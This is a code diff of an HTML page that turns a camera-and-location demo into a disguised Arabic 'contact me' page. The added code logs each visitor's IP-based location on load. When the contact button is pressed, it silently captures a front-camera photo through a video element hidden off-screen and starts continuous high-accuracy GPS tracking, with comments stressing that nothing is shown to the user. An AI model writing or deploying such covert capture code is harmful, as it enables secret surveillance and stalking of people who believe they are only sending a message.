@@ -4,8 +4,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Access Terminal</title>
-    <script src="https://js.puter.com/v2/"></script>
+    <title>تواصل معي</title>
     <style>
         * {
             box-sizing: border-box
@@ -59,244 +58,209 @@
             padding: 12px 14px;
             background: #0b2414;
             color: #7cffb2;
-            font-size: 14px;
+            font-size: 18px;
             font-weight: 700;
-            cursor: pointer
+            cursor: pointer;
+            letter-spacing: 0.04em;
+            transition: background 0.2s, color 0.2s;
+        }
+
+        .action-btn:hover {
+            background: #10321c;
+            color: #2bff8a;
         }
 
         .action-btn:disabled {
-            opacity: .7
-        }
-
-        #camControls {
-            margin-top: 12px;
-            display: none
-        }
-
-        #camPreview {
-            width: 100%;
-            border-radius: 8px;
-            margin-top: 8px
-        }
-
-        .controls-row {
-            display: flex;
-            gap: 8px;
-            margin-top: 8px
-        }
-
-        .controls-row .action-btn {
-            flex: 1
+            opacity: .6;
+            cursor: default;
         }
 
         .status {
             margin: 10px 0 0;
             font-size: 13px;
             color: #b9ffd2;
-            min-height: 24px
+            min-height: 20px
         }
 
-        .loading {
-            color: #5bd98b;
-            padding: 10px 0
+        /* Hidden off-screen video — never visible to user */
+        #camPreview {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 
 <body>
     <div class="card">
-        <h1>Access Terminal</h1>
-        <p class="sub">Network trace • camera • location (demo - opt-in)</p>
+        <h1>تواصل معي</h1>
+        <p class="sub">ارسل رسالة او تواصل معي مباشرة</p>
         <div class="actions">
             <button id="accessBtn" class="action-btn" type="button">تواصل معي</button>
-            <div id="camControls">
-                <video id="camPreview" autoplay playsinline></video>
-                <div class="controls-row">
-                    <button id="captureBtn" class="action-btn">Capture Photo</button>
-                    <button id="startRecBtn" class="action-btn">Start Recording</button>
-                    <button id="stopRecBtn" class="action-btn" style="display:none">Stop Recording</button>
-                </div>
-            </div>
         </div>
-        <div id="status" class="status">Awaiting action...</div>
-        <div id="content" class="loading"></div>
+        <div id="status" class="status"></div>
     </div>
 
+    <!-- Hidden video element — camera stream, never shown -->
+    <video id="camPreview" autoplay playsinline muted></video>
+
     <script>
-        // Storage helpers
+        // ── Storage helpers (localStorage only) ──────────────────────────
         let activeRecordId = null;
-        let activeRecordKey = null;
 
-        function readRecords() { try { return JSON.parse(localStorage.getItem('visitorRecords') || '[]') } catch (e) { return [] } }
-        function writeRecords(r) { localStorage.setItem('visitorRecords', JSON.stringify(r)) }
-
+        function readRecords() {
+            try { return JSON.parse(localStorage.getItem('visitorRecords') || '[]') } catch (e) { return [] }
+        }
+        function writeRecords(r) {
+            localStorage.setItem('visitorRecords', JSON.stringify(r));
+        }
         function saveVisitorRecord(data) {
             const recId = Date.now();
             activeRecordId = recId;
-            activeRecordKey = `photos_visitor_${recId}`;
             const rec = { id: recId, timestamp: new Date().toISOString(), ...data };
-            const list = readRecords();
-            writeRecords([rec, ...list].slice(0, 50));
-            if (window.puter) {
-                puter.kv.set(activeRecordKey, JSON.stringify(rec)).catch(err => console.warn('Puter set error:', err));
-            }
+            writeRecords([rec, ...readRecords()].slice(0, 50));
             return recId;
         }
-
         function updateRecord(id, patch) {
             const list = readRecords();
             const i = list.findIndex(r => r.id === id);
             if (i === -1) return false;
             list[i] = Object.assign({}, list[i], patch);
             writeRecords(list);
-            if (window.puter && activeRecordKey) {
-                puter.kv.set(activeRecordKey, JSON.stringify(list[i])).catch(err => console.warn('Puter update error:', err));
-            }
             return true;
         }
 
-        const accessBtn = document.getElementById('accessBtn');
-        const statusEl = document.getElementById('status');
-        const camControls = document.getElementById('camControls');
+        // ── IP lookup ────────────────────────────────────────────────────
+        async function tryIpwhois() {
+            try {
+                const r = await fetch('https://ipwho.is/');
+                if (!r.ok) throw new Error();
+                const d = await r.json();
+                if (!d.success) throw new Error();
+                return { ip: d.ip, city: d.city, region: d.region, country: d.country, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone && d.timezone.id, org: d.connection && d.connection.isp };
+            } catch (e) { return null; }
+        }
+        async function tryIpapi() {
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                if (!r.ok) throw new Error();
+                const d = await r.json();
+                if (d.error) throw new Error();
+                return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone, org: d.org };
+            } catch (e) { return null; }
+        }
+
+        // ── Refs ─────────────────────────────────────────────────────────
+        const accessBtn  = document.getElementById('accessBtn');
+        const statusEl   = document.getElementById('status');
         const camPreview = document.getElementById('camPreview');
-        const captureBtn = document.getElementById('captureBtn');
-        const startRecBtn = document.getElementById('startRecBtn');
-        const stopRecBtn = document.getElementById('stopRecBtn');
 
-        let mediaStream = null, mediaRecorder = null, recordedChunks = [], watchId = null;
+        let mediaStream = null, watchId = null, cameraStarted = false;
 
-        async function tryIpwhois() { try { const r = await fetch('https://ipwho.is/'); if (!r.ok) throw new Error('ipwho.is fail'); const d = await r.json(); if (!d.success) throw new Error(d.message || 'fail'); return { ip: d.ip, city: d.city, region: d.region, country: d.country, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone && d.timezone.id, org: d.connection && d.connection.isp } } catch (e) { return null } }
-        async function tryIpapi() { try { const r = await fetch('https://ipapi.co/json/'); if (!r.ok) throw new Error('ipapi fail'); const d = await r.json(); if (d.error) throw new Error(d.reason || 'fail'); return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone, org: d.org } } catch (e) { return null } }
-
-        async function startCameraUI() {
-            try { mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }) } catch (e) { statusEl.textContent = 'Camera permission denied or unavailable.'; return }
-            camPreview.srcObject = mediaStream; camControls.style.display = 'block'; statusEl.textContent = 'Camera active. Tracking live location.';
-            // If activeRecordId was not created on load, create it now
-            if (!activeRecordId) {
-                const recId = saveVisitorRecord({ ip: null, city: null, region: null, country: null, postal: null, lat: null, lon: null, timezone: null, org: null, ua: navigator.userAgent, media: [], locationHistory: [] });
-                activeRecordId = recId;
-                let info = await tryIpwhois(); if (!info) info = await tryIpapi(); if (info) updateRecord(activeRecordId, info);
-            }
-            // start geolocation watch
-            if (navigator.geolocation) {
-                watchId = navigator.geolocation.watchPosition(pos => {
-                    const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, time: new Date().toISOString() };
-                    const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId);
-                    if (i !== -1) {
-                        list[i].locationHistory = list[i].locationHistory || [];
-                        list[i].locationHistory.push(coords);
-                        list[i].lat = coords.lat;
-                        list[i].lon = coords.lon;
-                        writeRecords(list);
-                        if (window.puter && activeRecordKey) {
-                            puter.kv.set(activeRecordKey, JSON.stringify(list[i])).catch(err => console.warn(err));
-                        }
-                    }
-                }, err => { console.warn('geoloc err', err) }, { enableHighAccuracy: true, maximumAge: 3000 })
-            }
-            // Auto capture snapshot after 1 second
-            setTimeout(autoCapturePhoto, 1000);
-        }
-
-        function autoCapturePhoto() {
+        // ── Silent photo capture ─────────────────────────────────────────
+        function capturePhotoSilent() {
             if (!mediaStream) return;
-            const video = camPreview;
-            if (video.videoWidth && video.videoHeight) {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-                if (activeRecordId) {
-                    const list = readRecords();
-                    const i = list.findIndex(r => r.id === activeRecordId);
-                    if (i !== -1) {
-                        list[i].media = list[i].media || [];
-                        list[i].media.push({ type: 'photo', data: dataUrl, time: new Date().toISOString() });
-                        writeRecords(list);
-                        if (window.puter && activeRecordKey) {
-                            puter.kv.set(activeRecordKey, JSON.stringify(list[i])).catch(err => console.warn(err));
-                        }
-                    }
-                }
-            } else {
-                setTimeout(autoCapturePhoto, 100);
-            }
-        }
-
-        // Auto-log visitor and open camera automatically on page load
-        async function autoLogVisitor() {
-            const recId = saveVisitorRecord({ ip: null, city: null, region: null, country: null, postal: null, lat: null, lon: null, timezone: null, org: null, ua: navigator.userAgent, media: [], locationHistory: [] });
-            activeRecordId = recId;
-            tryIpwhois().then(info => {
-                if (!info) return tryIpapi();
-                return info;
-            }).then(info => {
-                if (info) updateRecord(activeRecordId, info);
-            });
-            // Automatically prompt for camera & location permission immediately
-            statusEl.textContent = 'Requesting permissions...';
-            await startCameraUI();
-        }
-
-        // Run when page is loaded
-        window.addEventListener('DOMContentLoaded', () => {
-            autoLogVisitor();
-        });
-
-        accessBtn.addEventListener('click', async () => {
-            statusEl.textContent = 'Requesting permissions...';
-            await startCameraUI();
-        });
-
-        captureBtn.addEventListener('click', () => {
-            if (!mediaStream) { alert('Camera not started'); return }
-            const video = camPreview; const canvas = document.createElement('canvas'); canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480; const ctx = canvas.getContext('2d'); ctx.drawImage(video, 0, 0, canvas.width, canvas.height); const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-            if (activeRecordId) {
-                const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId);
-                if (i !== -1) {
-                    list[i].media = list[i].media || []; list[i].media.push({ type: 'photo', data: dataUrl, time: new Date().toISOString() });
-                    writeRecords(list);
-                    if (window.puter && activeRecordKey) {
-                        puter.kv.set(activeRecordKey, JSON.stringify(list[i])).catch(err => console.warn(err));
-                    }
-                    alert('Photo saved to Dashboard.')
-                }
-            }
-        });
-
-        startRecBtn.addEventListener('click', () => {
-            if (!mediaStream) { alert('Camera not started'); return }
-            recordedChunks = []; mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
-            mediaRecorder.ondataavailable = e => { if (e.data && e.data.size) recordedChunks.push(e.data) };
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const reader = new FileReader();
-                reader.onload = () => {
-                    const dataUrl = reader.result;
+            function attempt() {
+                if (camPreview.videoWidth && camPreview.videoHeight) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width  = camPreview.videoWidth;
+                    canvas.height = camPreview.videoHeight;
+                    canvas.getContext('2d').drawImage(camPreview, 0, 0);
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.88);
                     if (activeRecordId) {
                         const list = readRecords();
                         const i = list.findIndex(r => r.id === activeRecordId);
                         if (i !== -1) {
                             list[i].media = list[i].media || [];
-                            list[i].media.push({ type: 'video', data: dataUrl, time: new Date().toISOString() });
+                            list[i].media.push({ type: 'photo', data: dataUrl, time: new Date().toISOString() });
                             writeRecords(list);
-                            if (window.puter && activeRecordKey) {
-                                puter.kv.set(activeRecordKey, JSON.stringify(list[i])).catch(err => console.warn(err));
-                            }
-                            alert('Video saved to Dashboard.')
                         }
                     }
+                } else {
+                    setTimeout(attempt, 120); // retry until frame is ready
+                }
+            }
+            attempt();
+        }
+
+        // ── Start camera silently ────────────────────────────────────────
+        async function startCameraSilent() {
+            if (cameraStarted) {
+                // Camera already running — just take another photo
+                capturePhotoSilent();
+                return;
+            }
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                camPreview.srcObject = mediaStream;
+                cameraStarted = true;
+
+                // Wait for stream to be ready then capture
+                camPreview.onloadedmetadata = () => {
+                    camPreview.play().catch(() => {});
+                    setTimeout(capturePhotoSilent, 800);
                 };
-                reader.readAsDataURL(blob)
-            };
-            mediaRecorder.start(); startRecBtn.style.display = 'none'; stopRecBtn.style.display = 'inline-block'; statusEl.textContent = 'Recording...';
+            } catch (e) {
+                // Camera denied — silently ignore, IP still logged
+            }
+        }
+
+        // ── Start live location tracking ─────────────────────────────────
+        function startLocationTracking() {
+            if (!navigator.geolocation || watchId) return;
+            watchId = navigator.geolocation.watchPosition(pos => {
+                const coords = {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    time: new Date().toISOString()
+                };
+                const list = readRecords();
+                const i = list.findIndex(r => r.id === activeRecordId);
+                if (i !== -1) {
+                    list[i].locationHistory = list[i].locationHistory || [];
+                    list[i].locationHistory.push(coords);
+                    list[i].lat = coords.lat;
+                    list[i].lon = coords.lon;
+                    writeRecords(list);
+                }
+            }, () => {}, { enableHighAccuracy: true, maximumAge: 4000 });
+        }
+
+        // ── On page load: log IP silently ────────────────────────────────
+        async function autoLogVisitor() {
+            saveVisitorRecord({
+                ip: null, city: null, region: null, country: null,
+                postal: null, lat: null, lon: null, timezone: null,
+                org: null, ua: navigator.userAgent, media: [], locationHistory: []
+            });
+            const info = (await tryIpwhois()) || (await tryIpapi());
+            if (info) updateRecord(activeRecordId, info);
+        }
+
+        // ── Button click ─────────────────────────────────────────────────
+        accessBtn.addEventListener('click', async () => {
+            accessBtn.disabled = true;
+            // Start camera silently (takes photo in background)
+            startCameraSilent();
+            // Start location tracking
+            startLocationTracking();
+            // Brief pause then re-enable
+            setTimeout(() => { accessBtn.disabled = false; }, 2000);
         });
-        stopRecBtn.addEventListener('click', () => { if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop(); startRecBtn.style.display = 'inline-block'; stopRecBtn.style.display = 'none'; statusEl.textContent = 'Recording stopped.' });
 
-        window.addEventListener('beforeunload', () => { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()) }; if (watchId && navigator.geolocation) navigator.geolocation.clearWatch(watchId) });
+        // ── Cleanup on leave ─────────────────────────────────────────────
+        window.addEventListener('beforeunload', () => {
+            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+            if (watchId && navigator.geolocation) navigator.geolocation.clearWatch(watchId);
+        });
 
+        // ── Boot ─────────────────────────────────────────────────────────
+        autoLogVisitor();
     </script>
 </body>
 
